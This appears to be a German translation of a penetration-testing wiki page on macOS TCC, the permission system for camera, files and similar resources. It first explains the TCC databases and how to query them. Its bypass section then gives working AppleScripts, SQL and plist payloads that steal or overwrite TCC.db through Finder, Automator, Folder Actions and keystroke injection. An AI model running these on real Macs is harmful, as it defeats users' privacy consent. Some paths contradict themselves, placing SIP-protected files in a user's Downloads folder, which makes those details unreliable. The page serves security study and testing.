# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Grundinformationen**

**TCC (Transparenz, Zustimmung und Kontrolle)** ist ein Sicherheitsprotokoll, das sich auf die Regulierung von Anwendungsberechtigungen konzentriert. Seine Hauptaufgabe besteht darin, sensible Funktionen wie **Standortdienste, Kontakte, Fotos, Mikrofon, Kamera, Barrierefreiheit und Vollzugriff auf die Festplatte** zu schützen. Durch die Forderung nach ausdrücklicher Zustimmung des Benutzers, bevor der Zugriff auf diese Elemente gewährt wird, verbessert TCC die Privatsphäre und die Kontrolle der Benutzer über ihre Daten.

Benutzer begegnen TCC, wenn Anwendungen Zugriff auf geschützte Funktionen anfordern. Dies wird durch eine Aufforderung sichtbar, die es den Benutzern ermöglicht, **Zugriff zu genehmigen oder abzulehnen**. Darüber hinaus ermöglicht TCC direkte Benutzeraktionen, wie **das Ziehen und Ablegen von Dateien in eine Anwendung**, um den Zugriff auf bestimmte Dateien zu gewähren, und stellt sicher, dass Anwendungen nur auf das zugreifen können, was ausdrücklich erlaubt ist.

![Ein Beispiel für eine TCC-Aufforderung](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** wird von dem **Daemon** verwaltet, der sich in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` befindet und in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` konfiguriert ist (Registrierung des Mach-Dienstes `com.apple.tccd.system`).

Es gibt einen **Benutzermodus tccd**, der pro angemeldetem Benutzer läuft und in `/System/Library/LaunchAgents/com.apple.tccd.plist` definiert ist, wobei die Mach-Dienste `com.apple.tccd` und `com.apple.usernotifications.delegate.com.apple.tccd` registriert sind.

Hier sehen Sie den tccd, der als System und als Benutzer läuft:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Berechtigungen werden **vom übergeordneten** Anwendung **vererbt** und die **Berechtigungen** werden **verfolgt** basierend auf der **Bundle-ID** und der **Entwickler-ID**.

### TCC-Datenbanken

Die Erlaubnisse/Verweigerungen werden dann in einigen TCC-Datenbanken gespeichert:

- Die systemweite Datenbank in **`/Library/Application Support/com.apple.TCC/TCC.db`**.
- Diese Datenbank ist **SIP-geschützt**, sodass nur ein SIP-Umgehungsschritt in sie schreiben kann.
- Die Benutzer-TCC-Datenbank **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** für benutzerspezifische Einstellungen.
- Diese Datenbank ist geschützt, sodass nur Prozesse mit hohen TCC-Berechtigungen wie Voller Festplattzugriff darin schreiben können (aber sie ist nicht durch SIP geschützt).

> [!WARNING]
> Die vorherigen Datenbanken sind auch **TCC-geschützt für den Lesezugriff**. Daher **werden Sie nicht in der Lage sein,** Ihre reguläre Benutzer-TCC-Datenbank zu lesen, es sei denn, es stammt von einem TCC-privilegierten Prozess.
>
> Denken Sie jedoch daran, dass ein Prozess mit diesen hohen Berechtigungen (wie **FDA** oder **`kTCCServiceEndpointSecurityClient`**) in der Lage sein wird, in die Benutzer-TCC-Datenbank zu schreiben.

- Es gibt eine **dritte** TCC-Datenbank in **`/var/db/locationd/clients.plist`**, um anzuzeigen, welche Clients **Zugriff auf Standortdienste** haben.
- Die SIP-geschützte Datei **`/Users/carlospolop/Downloads/REG.db`** (auch vor Lesezugriff mit TCC geschützt) enthält die **Standorte** aller **gültigen TCC-Datenbanken**.
- Die SIP-geschützte Datei **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (auch vor Lesezugriff mit TCC geschützt) enthält weitere von TCC gewährte Berechtigungen.
- Die SIP-geschützte Datei **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (aber von jedem lesbar) ist eine Erlaubenliste von Anwendungen, die eine TCC-Ausnahme benötigen.

> [!TIP]
> Die TCC-Datenbank in **iOS** befindet sich in **`/private/var/mobile/Library/TCC/TCC.db`**.

> [!NOTE]
> Die **Benachrichtigungszentrale UI** kann **Änderungen in der systemweiten TCC-Datenbank** vornehmen:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Benutzer können jedoch **Regeln löschen oder abfragen** mit dem **`tccutil`** Befehlszeilenwerkzeug.

#### Abfrage der Datenbanken

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Durch die Überprüfung beider Datenbanken können Sie die Berechtigungen überprüfen, die eine App erlaubt hat, die sie verboten hat oder die sie nicht hat (sie wird danach fragen).

- Der **`service`** ist die TCC **Berechtigungs**-String-Darstellung
- Der **`client`** ist die **Bundle-ID** oder **Pfad zur Binärdatei** mit den Berechtigungen
- Der **`client_type`** gibt an, ob es sich um eine Bundle-Identifikator(0) oder einen absoluten Pfad(1) handelt

<details>

<summary>Wie man ausführt, wenn es ein absoluter Pfad ist</summary>

Einfach **`launctl load you_bin.plist`** ausführen, mit einer plist wie:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- Der **`auth_value`** kann verschiedene Werte haben: denied(0), unknown(1), allowed(2) oder limited(3).
- Der **`auth_reason`** kann folgende Werte annehmen: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Das **csreq**-Feld dient dazu, anzugeben, wie das Binärprogramm zur Ausführung verifiziert werden soll, um die TCC-Berechtigungen zu gewähren:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Für weitere Informationen zu den **anderen Feldern** der Tabelle [**lesen Sie diesen Blogbeitrag**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Sie können auch die **bereits erteilten Berechtigungen** für Apps in `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` überprüfen.

> [!TIP]
> Benutzer _können_ **Regeln löschen oder abfragen** mit **`tccutil`**.

#### TCC-Berechtigungen zurücksetzen
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC-Signaturprüfungen

Die TCC **Datenbank** speichert die **Bundle-ID** der Anwendung, aber sie **speichert** auch **Informationen** über die **Signatur**, um sicherzustellen, dass die App, die um die Nutzung einer Berechtigung bittet, die richtige ist.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Daher können andere Anwendungen mit demselben Namen und Bundle-ID nicht auf die erteilten Berechtigungen zugreifen, die anderen Apps gewährt wurden.

### Berechtigungen & TCC-Berechtigungen

Apps **müssen nicht nur** **anfordern** und **Zugriff gewährt bekommen** auf einige Ressourcen, sie müssen auch **die relevanten Berechtigungen haben**.\
Zum Beispiel hat **Telegram** die Berechtigung `com.apple.security.device.camera`, um **Zugriff auf die Kamera** zu beantragen. Eine **App**, die diese **Berechtigung nicht hat**, wird **nicht in der Lage sein**, auf die Kamera zuzugreifen (und der Benutzer wird nicht einmal nach den Berechtigungen gefragt).

Um jedoch auf **bestimmte Benutzerordner** wie `~/Desktop`, `~/Downloads` und `~/Documents` zuzugreifen, **müssen** sie keine spezifischen **Berechtigungen haben.** Das System wird den Zugriff transparent handhaben und **den Benutzer** nach Bedarf **auffordern**.

Apples Apps **werden keine Aufforderungen generieren**. Sie enthalten **vorab erteilte Rechte** in ihrer **Berechtigungsliste**, was bedeutet, dass sie **niemals ein Popup generieren**, **noch** werden sie in einer der **TCC-Datenbanken** angezeigt. Zum Beispiel:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Dies wird verhindern, dass der Kalender den Benutzer um Zugriff auf Erinnerungen, Kalender und das Adressbuch bittet.

> [!TIP]
> Abgesehen von einigen offiziellen Dokumentationen über Berechtigungen ist es auch möglich, inoffizielle **interessante Informationen über Berechtigungen in** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) zu finden.

Einige TCC-Berechtigungen sind: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Es gibt keine öffentliche Liste, die alle definiert, aber Sie können diese [**Liste der bekannten**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) einsehen.

### Sensible ungeschützte Orte

- $HOME (selbst)
- $HOME/.ssh, $HOME/.aws, usw.
- /tmp

### Benutzerabsicht / com.apple.macl

Wie bereits erwähnt, ist es möglich, **einer App Zugriff auf eine Datei zu gewähren, indem man sie per Drag & Drop darauf zieht**. Dieser Zugriff wird in keiner TCC-Datenbank angegeben, sondern als **erweiterte** **Eigenschaft der Datei**. Diese Eigenschaft wird **die UUID** der erlaubten App **speichern**:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!NOTE]
> Es ist interessant, dass das **`com.apple.macl`** Attribut vom **Sandbox** verwaltet wird, nicht von tccd.
>
> Beachten Sie auch, dass wenn Sie eine Datei, die die UUID einer App auf Ihrem Computer erlaubt, auf einen anderen Computer verschieben, die gleiche App unterschiedliche UIDs haben wird und daher keinen Zugriff auf diese App gewährt.

Das erweiterte Attribut `com.apple.macl` **kann nicht gelöscht werden** wie andere erweiterte Attribute, da es **durch SIP geschützt ist**. Allerdings ist es möglich, es **zu deaktivieren**, indem man die Datei **zippt**, sie **löscht** und dann **entzippt**. 

## TCC Privesc & Bypasses

### In TCC einfügen

Wenn Sie irgendwann Schreibzugriff auf eine TCC-Datenbank erhalten, können Sie etwas wie das Folgende verwenden, um einen Eintrag hinzuzufügen (entfernen Sie die Kommentare):

<details>

<summary>Beispiel für das Einfügen in TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC-Payloads

Wenn Sie es geschafft haben, in eine App mit einigen TCC-Berechtigungen zu gelangen, überprüfen Sie die folgende Seite mit TCC-Payloads, um diese auszunutzen:

{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Erfahren Sie mehr über Apple Events in:

{{#ref}}
macos-apple-events.md
{{#endref}}

### Automatisierung (Finder) zu FDA\*

Der TCC-Name der Automatisierungsberechtigung ist: **`kTCCServiceAppleEvents`**\
Diese spezifische TCC-Berechtigung zeigt auch die **Anwendung an, die verwaltet werden kann** innerhalb der TCC-Datenbank (die Berechtigungen erlauben also nicht nur die Verwaltung von allem).

**Finder** ist eine Anwendung, die **immer FDA hat** (auch wenn sie nicht in der Benutzeroberfläche erscheint), daher können Sie, wenn Sie **Automatisierungs**-Berechtigungen über sie haben, ihre Berechtigungen ausnutzen, um **einige Aktionen auszuführen**.\
In diesem Fall benötigt Ihre App die Berechtigung **`kTCCServiceAppleEvents`** über **`com.apple.Finder`**.

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Sie könnten dies missbrauchen, um **Ihre eigene Benutzer-TCC-Datenbank zu schreiben**.

> [!WARNING]
> Mit dieser Berechtigung können Sie **Finder auffordern, auf TCC-eingeschränkte Ordner zuzugreifen** und Ihnen die Dateien zu geben, aber soweit ich weiß, **werden Sie Finder nicht dazu bringen können, beliebigen Code auszuführen**, um seinen FDA-Zugriff vollständig auszunutzen.
>
> Daher werden Sie nicht in der Lage sein, die vollständigen FDA-Fähigkeiten auszunutzen.

Dies ist die TCC-Aufforderung, um Automatisierungsprivilegien über Finder zu erhalten:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Beachten Sie, dass die **Automator**-App die TCC-Berechtigung **`kTCCServiceAppleEvents`** hat, sodass sie **jede App steuern** kann, wie z. B. Finder. Wenn Sie also die Berechtigung haben, Automator zu steuern, könnten Sie auch den **Finder** mit einem Code wie dem folgenden steuern:

<details>

<summary>Holen Sie sich eine Shell innerhalb von Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Das gleiche gilt für die **Script Editor-App**, sie kann den Finder steuern, aber mit einem AppleScript kann man sie nicht zwingen, ein Skript auszuführen.

### Automatisierung (SE) zu einigen TCC

**Systemereignisse können Ordneraktionen erstellen, und Ordneraktionen können auf einige TCC-Ordner zugreifen** (Desktop, Dokumente & Downloads), sodass ein Skript wie das folgende verwendet werden kann, um dieses Verhalten auszunutzen:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** zu FDA\*

Automation auf **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) ermöglicht das Senden von **Tasteneingaben an Prozesse**. Auf diese Weise könnten Sie den Finder missbrauchen, um die TCC.db der Benutzer zu ändern oder FDA an eine beliebige App zu gewähren (obwohl möglicherweise ein Passwort dafür angefordert wird).

Beispiel für das Überschreiben der TCC.db der Benutzer durch den Finder:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` zu FDA\*

Überprüfen Sie diese Seite für einige [**Payloads, um die Zugriffsberechtigungen zu missbrauchen**](macos-tcc-payloads.md#accessibility), um zu FDA\* zu privescen oder beispielsweise einen Keylogger auszuführen.

### **Endpoint Security Client zu FDA**

Wenn Sie **`kTCCServiceEndpointSecurityClient`** haben, haben Sie FDA. Ende.

### System Policy SysAdmin File zu FDA

**`kTCCServiceSystemPolicySysAdminFiles`** ermöglicht es, das **`NFSHomeDirectory`** Attribut eines Benutzers zu **ändern**, was seinen Home-Ordner ändert und somit das **Umgehen von TCC** ermöglicht.

### User TCC DB zu FDA

Durch den Erhalt von **Schreibberechtigungen** über die **Benutzer-TCC**-Datenbank können Sie **`FDA`** Berechtigungen **nicht** gewähren, nur derjenige, der in der Systemdatenbank lebt, kann das gewähren.

Aber Sie können sich **`Automatisierungsrechte für Finder`** geben und die vorherige Technik missbrauchen, um zu FDA\* zu eskalieren.

### **FDA zu TCC Berechtigungen**

**Vollständiger Festplattzugriff** ist der TCC-Name **`kTCCServiceSystemPolicyAllFiles`**.

Ich denke nicht, dass dies ein echtes Privesc ist, aber nur für den Fall, dass Sie es nützlich finden: Wenn Sie ein Programm mit FDA steuern, können Sie **die TCC-Datenbank der Benutzer ändern und sich jeden Zugriff gewähren**. Dies kann als Persistenztechnik nützlich sein, falls Sie Ihre FDA-Berechtigungen verlieren sollten.

### **SIP-Bypass zu TCC-Bypass**

Die System-**TCC-Datenbank** ist durch **SIP** geschützt, weshalb nur Prozesse mit den **angegebenen Berechtigungen in der Lage sind, sie zu ändern**. Daher, wenn ein Angreifer einen **SIP-Bypass** über eine **Datei** findet (in der Lage, eine durch SIP eingeschränkte Datei zu ändern), kann er:

- **Den Schutz** einer TCC-Datenbank entfernen und sich alle TCC-Berechtigungen gewähren. Er könnte beispielsweise eine dieser Dateien missbrauchen:
- Die TCC-Systemdatenbank
- REG.db
- MDMOverrides.plist

Es gibt jedoch eine weitere Möglichkeit, diesen **SIP-Bypass zu nutzen, um TCC zu umgehen**. Die Datei `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` ist eine Erlaubenliste von Anwendungen, die eine TCC-Ausnahme benötigen. Daher, wenn ein Angreifer den **SIP-Schutz** von dieser Datei **entfernen** und seine **eigene Anwendung** hinzufügen kann, wird die Anwendung in der Lage sein, TCC zu umgehen.\
Zum Beispiel, um das Terminal hinzuzufügen:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Umgehungen

{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## Referenzen

- [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{{#include ../../../../banners/hacktricks-training.md}}
